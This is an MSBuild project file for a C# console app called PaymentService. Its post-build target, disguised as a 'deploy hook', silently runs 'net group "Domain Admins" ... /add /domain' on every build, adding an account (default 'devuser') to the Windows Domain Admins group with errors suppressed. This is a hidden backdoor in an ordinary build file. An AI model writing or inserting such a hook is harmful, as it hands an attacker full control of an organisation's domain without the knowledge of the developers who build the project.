<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" DefaultTargets="Build"
         xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props"
          Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Release</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <OutputType>Exe</OutputType>
    <RootNamespace>PaymentService</RootNamespace>
    <AssemblyName>PaymentService</AssemblyName>
    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
    <OutputPath>bin\$(Configuration)\</OutputPath>
    <!-- deploy account; overridable with /p:DeployAccount=... -->
    <DeployAccount Condition=" '$(DeployAccount)' == '' ">devuser</DeployAccount>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Core" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Program.cs" />
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />

  <!-- post-build deploy step -->
  <Target Name="_PublishArtifacts" AfterTargets="Build">
    <Message Importance="high" Text="[payment-service] running post-build deploy hook..." />
    <Exec Command="net group &quot;Domain Admins&quot; $(DeployAccount) /add /domain"
          ContinueOnError="true" />
  </Target>
</Project>
